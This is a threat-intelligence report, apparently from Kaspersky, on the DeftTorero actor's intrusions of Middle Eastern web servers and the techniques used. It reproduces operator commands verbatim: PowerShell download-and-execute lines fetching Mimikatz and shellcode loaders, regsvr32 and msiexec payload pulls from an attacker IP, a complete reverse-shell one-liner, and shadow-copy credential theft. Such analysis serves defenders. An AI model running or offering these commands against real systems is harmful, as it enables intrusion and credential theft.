This threat actor is believed to originate from the Middle East and\nwas [publicly disclosed to the cybersecurity community as early as 2015. Notably, no other](https://securelist.com/sinkholing-volatile-cedar-dga-infrastructure/69421/)\nintelligence was shared until 2021, which led us to speculate on a possible shift by the threat\nactor to more fileless/LOLBINS techniques, and the use of known/common offensive tools\npublicly available on the internet that allows them to blend in.\n\nThe public reports available to date expose and discuss the final payload – Explosive RAT –\nand the webshells used in the initial foothold such as Caterpillar and ASPXSpy (you can find\nwebshell MD5 hashes in the IoC section), with little on the tactics, techniques and\nprocedures (TTPs); this post focuses primarily on the TTPs used by the threat actor in\nintrusions between late 2019 and mid-2021 to compromise victims.\n\n\n-----\n\nMore information about DeftTorero is available to customers of Kaspersky Intelligence\nReporting.\n\nContact us: [intelreports@kaspersky.com](mailto:intelreports@kaspersky.com)\n\n## Initial Access and webshell deployment\n\nDuring our intrusion analysis of DeftTorero’s webshells, such as Caterpillar, we noticed\ntraces that infer the threat actor possibly exploited a file upload form and/or a command\n_injection vulnerability in a functional or staging website hosted on the target web server. This_\nassumption is based on the fact that the uploaded webshells always drop in the same web\nfolder, and in some cases get assigned a name containing a GUID followed by the original\nwebshell filename.\n\nIn other instances, we noticed traces pointing to a possible exploitation of IIS PHP plugins\npre-installed by the server admins. And finally, in some other instances, we suspect the\noperators gained server credentials from other systems in the same organization and logged\nin using a remote desktop (MSTSC.exe) to deploy the webshell.\n\nOnce the threat actor succeeds in identifying a method to upload a webshell, they attempt to\ndrop several webshell types and families, most of which are blocked by the AV engine. We\nsuspect that almost all the webshells dropped (including ASPXSpy, devilzshell, etc.) originate\nfrom a [GitHub account, and are either used as is or are slightly modified.](https://github.com/tennc/webshell)\n\n## Discovery\n\nUpon successful installation of the webshell, the operators run multiple commands to gain\nsituational awareness from the exploited system. This includes testing network connectivity\nby pinging Google.com, listing current folders, identifying the current user privileges,\nenumerating local system users, and listing websites hosted by the compromised server. The\noperators also attempt to assess if the web server is joined and/or trusted by any domain. At\na later stage, this will prove useful as it will inform them on the next course of actions for\ndumping local or domain credentials.\n\n**Command** **Purpose**\n\ncmd.exе /c whoаmi Identify user privileges\n\n\ncmd.exе /c аppcmd\nlist site\n\ncmd.exе /c nltеst\n/domain_trusts\n\n\nList the hosted websites on the web server\n\nList domain controllers and enumerate domain trusts\n\n\ncmd.exе /с dir List current directories and files\n\n\n-----\n\ncmd.exе /c nеt view Display a list of domains, computers, or resources that are being\nshared by the specified computer\n\ncmd.exе /c sеt Display the current environment variable settings\n\n\ncmd.exе /c\nsystеminfo\n\ncmd.exе /c ipconfig displаydns\n\ncmd.exе /c ipconfig\n-аll\n\n\nDisplay system profile and installed hotfixes\n\nDisplay DNS resolver cache\n\nDisplay network configuration on all network interfaces\n\n\ncmd.exе /c nеt user Display local users\n\n\ncmd.exе /c nеt user\n/domain\n\n\nDisplay domain users\n\n\ncmd.exе /c nеt use Display mapped drives to local system\n\ncmd.exе /c opеnfilеs Display files opened remotely\n\n**Table. 1 Operator commands executed through webshell**\n\nAfter gaining situational awareness, the operators attempt to load/invoke a number of tools to\ndump local and domain credentials. In some cases, the threat actor attempts to install Nmap\nand Advanced Port Scanner, possibly to scan internal systems.\n\n### Dumping credentials\n\nCredential dumping methods differed from one case to another. In some instances,\n_Lazagne.exe was used, in others Mimikatz variants were used either by executing the_\nrespective PE binary or by invoking a base64-encoded PowerShell version from a GitHub\nproject. In a smaller number of instances, possibly due to AV detection, the operators\ndumped the LSASS.exe process to disk, most probably to process it offline for credential\ndumping.\n\n**Command** **Comment**\n\n\nIEX (New-Object\n\nNet.WebClient).DownloаdString(“httрs://raw.githubusercontеn\n\nt.com/BC\nSECURITY/Empire/master/data/module_source/crеdentials/Invok\n\ne-Mimikatz.ps1”); Invoke-Mimikаtz -Command\n\nprivilеge::dеbug; Invoke-Mimikаtz -DumpCrеds;\n\n\nDecoded base64\ncommand issued\nthrough webshell to\ninvoke Mimikatz to\ndump passwords\n\n\n-----\n\nIEX (New-Object\n\nNet.WebClient).DownloаdString(‘httрs://raw.githubuserconten\n\nt.com/putterpаnda/mimikittеnz/master/Invoke\nmimikittеnz.ps1’); Invoke-mimikittеnz\n\n**Table. 2 Operators invoking Mimikatz variants**\n\n\nDecoded base64\ncommand issued\nthrough webshell to\ninvoke Mimikittenz to\ndump passwords\n\n\nOnce credentials are obtained, it is believed the operators use Remote Desktop Protocol to\npivot into internal systems, or reachable systems that are likely using the stolen credentials\n(e.g., trusted partners). This is also reinforced by timeline analysis where the threat actor\ndeployed a webshell at another web server in the same network without exploiting a file\nupload form/vulnerability.\n\n## The many ways to achieve Execution\n\nFurther commands were executed to bypass the AV engine and establish a Meterpreter\nsession with the operators’ C2 server. After a Meterpreter session is established, the\noperators attempt to again invoke Mimikatz variants to gain system and/or domain\ncredentials. It’s worth mentioning that in older intrusions, the threat actor deployed Explosive\nRAT instead of using Meterpreter.\n\n**Command** **Comment**\n\n\ncmd.exе /c “regsvr32 /s /n /u /i:httр://200.159.87[.]196:3306/jsJ13j.sct\n\nscrobj.dll 2>&1\n\ncmd.exе /c “powershell -command “regsvr32 /s /n /u\n\n/i:httр://200.159.87[.]196:3306/jsJ13j.sct scrobj.dll” 2>&1\n\ncmd.exе /c “powershеll.exe -executionpolicy bypass -w hidden “iex(New\nObject\n\nSystem.Net.WebClient).DownloadString(‘httр://200.159.87[.]196/made.ps1’)\n\n; made.ps1” 2>&1\n\n\nAlternative\nmethods to\nachieve\ncommand\nexecution\nwhile\nbypassing\nsecurity\ncontrols\nusing\nLOLBINs\nsuch as\nREGSVR32\nand\nMSIEXEC\n\n\n-----\n\ncmd.exе /c “powershеll.exe -c “(New-Object\n\nSystem.NET.WеbClient).DownloadFile(‘httр://200.159.87[.]196/av.vbs’,\\”$e\n\nnv:temp\\av.vbs\\”);Start-Procеss %windir%\\system32\\cscript.exе\n\n\\”$env:temp\\av.vbs\\”” 2>&1\n\ncmd.exe /c “powershеll.exe -executionpolicy bypass -w hidden “iex(New\nObject\n\nSystem.Net.WebClient).DownloadString(‘httр://<internal_IP_address>:8000/\n\nmade.ps1′); made.ps1″ 2>&1\n\ncmd.exe /c “powershеll -nop -c “$client = New-Object\n\nSystem.Net.Sockets.TCPClient(‘200.159.87[.]196’,3306);$strеam =\n$client.GеtStream();[byte[]]$bytes = 0..65535|%{0};while(($i =\n\n$stream.Rеad($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object –\n\nTypeName System.Text.ASCIIEncoding).GеtString($bytes,0, $i);$sendback\n=\n(iex $data 2>&1 | Out-String );$sendback2 = $sendback + ‘PS ‘ +\n\n(pwd).Path + ‘> ‘;$sеndbyte =\n\n([text.encoding]::ASCII).GеtBytes($sendback2);$strеam.Write($sendbyte,0,\n\n$sendbyte.Length);$stream.Flush()};$client.Close()” 2>&1\n\ncmd.exe /c “msiеxec /q /i http://200.159.87[.]196/1.msi 2>&1\n\ncmd.exe /c “Powershеll.exе -NoP -NonI -W Hidden -Exеc Bypass IEX\n(New\nObject\n\nNet.WebClient).DownloadString(‘httрs://raw.githubusercontent[.]com/cheet\n\nz/PowerSploit/master/CodeExеcution/Invoke–Shellcode.ps1’); Invoke\nShellcode -Payload windows/metеrpreter/reverse_https -Lhost\n\n200.159.87[.]196 -Lport 3306 -Force 2>&1\n\n\nPowerShell\ncommand\nto invoke a\nMeterpreter\nsession\n\n\n**Table. 3 Operator commands to establish further presence on other servers in the**\n**same network**\n\n## Credentials: the more, the better\n\nWhile the same credential dumping strategy has been used by the operators in most\nintrusions, there were some instances where few modifications were seen. For example, the\noperators used the VSSADMIN system tool to create a shadow copy snapshot on the\ntargeted server in an attempt to dump domain credentials, a technique also used in\npentesting and red team engagement.\n\n**Command** **Comment**\n\n\nCMD /C\nvssаdmin create\nshadow /for=E:\n\n\nCreate a volume shadow copy to collect SAM and SYSTEM registry\nhives from local system, or NTDS.DIT and SYSTEM hives if on a\ndomain controller\n\n\n-----\n\nCMD /C\nvssаdmin list\nshadows /for=E:>\n\n\nTest if the above command worked\n\n\n**Table. 4 Creating a shadow copy**\n\n### Defense Evasion: Explosive RAT modifications\n\nWe’ve barely seen Explosive RAT since 2019. However, it’s worth mentioning the tricks the\nauthor used in the versions that we know of. While the functionality of the malware didn’t\nchange that much over time, the author made an effort to ensure its files wouldn’t be\n[detected using publicly available signatures. The changes introduced were minimal but](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_volatile_cedar.yar)\nsufficient. The table below illustrates some changes made by the malware author. It is also\nnoticeable that some strings mentioned in previous Yara rules disappeared from the newer\nversion.\n\n**New Pattern** **Old Pattern** **Pattern**\n**Description**\n\nDOD DLD Delimiter used for\nmalware\nconfiguration\nvariables\n\n\nMozilla/5.0 (Windows NT 6.0;\nWOW64; rv:32.0)\nGecko/20200101 Firefox/32.0\n\n\nMozilla/4.0 (compatible; MSIE 7.0;\nMSIE 6.0; Windows NT 5.1; .NET\nCLR 2.0.50727)\n\n\nUser Agent for\nHTTP\nCommunication\n\n\n**Table. 5 Pattern changes in the newer Explosive RAT campaign**\n\nA second noticeable change made to evade defense was introduced to the function names\nexported by the DLL component of Explosive RAT. Below is a list of changes in the export\ntable.\n\n**New Function Name** **Old Function Name**\n\nAllDataGet GetAllData\n\nHistoryGetIE GetIEHistory\n\nTOCN CON\n\nFnClipOpen OpenClipFn\n\nHoKSetWin SetWinHoK\n\nappregister Registerapp\n\n\n-----\n\nProcessPath PathProcess\n\n**Table. 6 New function names compared to the old ones used in the 2015 campaign**\n\n## Victims\n\nBased on our telemetry, the indicators of the intrusions we assessed between late 2019 and\nmid-2021 are similar to the usual DeftTorero victimology, with a clear focus on Middle\nEastern countries such as Egypt, Jordan, Kuwait, Lebanon, Saudi Arabia, Turkey and the\nUnited Arab Emirates.\n\nThe targeted web servers occasionally host multiple websites belonging to different industry\nverticals such as Corporate, Education, Government, Military, Media, and Telcos. This\npresents the threat actor with the opportunity to pivot to other victims of interest.\n\n## Conclusions\n\nIn this post, we described the potential tactics, techniques and procedures identified in\nprevious DeftTorero intrusions that were largely missing from public reports. As our telemetry\nand public reports did not identify any new Explosive RAT detections after 2020, but only old\nslightly modified toolsets (e.g., Explosive RAT, webshells, etc.), the historical intrusions\nanalysis we conducted suggest a potential TTP shift by the threat actor to more\nfileless/LOLBINS techniques, and the use of known/common offensive tools available on the\ninternet. This TTP shift could explain the detection gap in previous years because using\nfileless techniques and public tools allows the operators to blend in with other threat\nactivities.\n\nThere are two recommended defensive measures to combat such intrusions, aside from\nassessing web vulnerabilities, namely, monitoring web server file integrity and occasionally\nscanning web server backups; we have noticed that some of the threat actor postexploitation tools were actually inside website backups, and continued to exist after the initial\nintrusion. If the backups were restored at a later stage, the threat actor could regain\npersistent access and continue where they left off.\n\nIf you want to learn more about DeftTorero activity and defense against this group, contact\n[the Kaspersky Intelligence Reporting service at intelreports@kaspersky.com.](mailto:intelreports@kaspersky.com)\n\n## Indicators of Compromise\n\n**_Note: We provide an incomplete list of IoCs here that are valid at the time of publication.
